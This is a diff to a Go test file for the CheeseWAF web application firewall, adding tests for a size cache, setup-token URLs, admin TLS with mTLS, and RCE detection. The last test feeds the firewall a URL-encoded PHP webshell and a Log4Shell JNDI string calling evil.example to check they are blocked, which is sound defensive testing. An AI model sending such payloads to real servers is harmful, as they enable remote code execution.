@@ -3,19 +3,61 @@ package cli
 import (
 	"bytes"
 	"context"
+	"crypto/ecdsa"
+	"crypto/elliptic"
+	"crypto/rand"
+	"crypto/tls"
+	"crypto/x509"
+	"encoding/pem"
 	"errors"
+	"math/big"
 	"net/http"
 	"net/http/httptest"
 	"os"
 	"path/filepath"
 	"strings"
 	"testing"
+	"time"
 
 	"github.com/LaokeQwQ/CheeseWAF/internal/config"
 	"github.com/LaokeQwQ/CheeseWAF/internal/engine"
 	"github.com/LaokeQwQ/CheeseWAF/internal/setup"
 	"github.com/LaokeQwQ/CheeseWAF/internal/storage"
 )
+
+func TestDirectorySizeCacheAvoidsRepeatedWalksUntilExpiry(t *testing.T) {
+	root := t.TempDir()
+	firstPath := filepath.Join(root, "first.bin")
+	if err := os.WriteFile(firstPath, []byte("1234"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	cache := newDirectorySizeCache(time.Hour)
+	now := time.Now()
+	if got := cache.size(root, now); got != 4 {
+		t.Fatalf("first size = %d, want 4", got)
+	}
+	if err := os.WriteFile(filepath.Join(root, "second.bin"), []byte("56789"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	if got := cache.size(root, now.Add(time.Minute)); got != 4 {
+		t.Fatalf("cached size = %d, want 4", got)
+	}
+	if got := cache.size(root, now.Add(2*time.Hour)); got != 9 {
+		t.Fatalf("refreshed size = %d, want 9", got)
+	}
+}
+
+func TestSetupBrowserURLUsesFragmentAndReachableLoopbackHost(t *testing.T) {
+	got := setupBrowserURL("https", "0.0.0.0:9443", "secret with+symbols")
+	want := "https://127.0.0.1:9443/setup#setup_token=secret+with%2Bsymbols"
+	if got != want {
+		t.Fatalf("setupBrowserURL() = %q, want %q", got, want)
+	}
+	if strings.Contains(got, "?setup_token=") {
+		t.Fatalf("setup token must not be placed in the query string: %q", got)
+	}
+}
 
 func TestEnsureAdminTLSCertificateGeneratesOnce(t *testing.T) {
 	root := t.TempDir()
@@ -47,6 +89,61 @@ func TestEnsureAdminTLSCertificateGeneratesOnce(t *testing.T) {
 	keyAfter, _ := os.ReadFile(cfg.Server.AdminTLS.KeyFile)
 	if !bytes.Equal(certBefore, certAfter) || !bytes.Equal(keyBefore, keyAfter) {
 		t.Fatal("existing admin TLS material was unexpectedly rotated")
+	}
+}
+
+func TestAdminTLSConfigRequestsClusterClientCertWhenMTLSRequired(t *testing.T) {
+	root := t.TempDir()
+	cfg := config.Default()
+	cfg.Server.AdminTLS.Enabled = true
+	cfg.Server.AdminTLS.SelfSigned = true
+	cfg.Server.AdminTLS.CertFile = filepath.Join(root, "admin.crt")
+	cfg.Server.AdminTLS.KeyFile = filepath.Join(root, "admin.key")
+	if err := ensureAdminTLSCertificate(&cfg); err != nil {
+		t.Fatal(err)
+	}
+
+	caKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
+	if err != nil {
+		t.Fatal(err)
+	}
+	tmpl := &x509.Certificate{
+		SerialNumber:          big.NewInt(1),
+		NotBefore:             time.Now().Add(-time.Hour),
+		NotAfter:              time.Now().Add(time.Hour),
+		IsCA:                  true,
+		BasicConstraintsValid: true,
+		KeyUsage:              x509.KeyUsageCertSign,
+	}
+	caDER, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &caKey.PublicKey, caKey)
+	if err != nil {
+		t.Fatal(err)
+	}
+	caFile := filepath.Join(root, "ca.pem")
+	if err := os.WriteFile(caFile, pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: caDER}), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	tlsConfig, scheme, err := adminTLSConfig(cfg.Server.AdminTLS, config.InterconnectConfig{
+		MTLSRequired: true,
+		CAFile:       caFile,
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if scheme != "https" || tlsConfig == nil {
+		t.Fatalf("scheme=%s config=%v", scheme, tlsConfig)
+	}
+	if tlsConfig.ClientAuth != tls.VerifyClientCertIfGiven || tlsConfig.ClientCAs == nil {
+		t.Fatalf("admin TLS must verify presented cluster client certs: auth=%v cas=%v", tlsConfig.ClientAuth, tlsConfig.ClientCAs)
+	}
+
+	plain, _, err := adminTLSConfig(cfg.Server.AdminTLS)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if plain.ClientAuth != tls.NoClientCert {
+		t.Fatalf("admin TLS without interconnect mTLS must stay browser-usable, got %v", plain.ClientAuth)
 	}
 }
 
@@ -604,6 +701,56 @@ func TestBuildPipelineUsesSingleSemanticAnalyzerPath(t *testing.T) {
 	}
 	if !strings.HasPrefix(result.DetectorID, "semantic.analyzer") {
 		t.Fatalf("expected single analyzer detector id, got %q", result.DetectorID)
+	}
+}
+
+func TestBuildPipelineWiresRCEUmbrellaCategories(t *testing.T) {
+	cfg := &config.Config{
+		Sites: []config.SiteConfig{
+			{
+				ID:      "default",
+				Enabled: true,
+				WAF: config.WAFConfig{
+					Enabled: true,
+					Mode:    "block",
+					SemanticEngines: config.SemanticEngineSwitches{
+						RCE: true,
+					},
+				},
+			},
+		},
+	}
+	pipeline, err := buildPipeline(cfg)
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	tests := []struct {
+		name     string
+		target   string
+		category string
+	}{
+		{name: "webshell", target: "/upload?payload=%3C%3Fphp%20eval(%24_POST%5B%27cmd%27%5D)%3B%20%3F%3E", category: "webshell"},
+		{name: "log4shell", target: "/lookup?value=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D", category: "log4shell"},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			req, err := http.NewRequest(http.MethodGet, tc.target, nil)
+			if err != nil {
+				t.Fatal(err)
+			}
+			reqCtx, err := engine.NewRequestContext(req, "default")
+			if err != nil {
+				t.Fatal(err)
+			}
+			result, err := pipeline.Detect(context.Background(), reqCtx)
+			if err != nil {
+				t.Fatal(err)
+			}
+			if result == nil || result.Category != tc.category || result.Action != engine.ActionBlock {
+				t.Fatalf("expected production %s detection, got %+v", tc.category, result)
+			}
+		})
 	}
 }
 
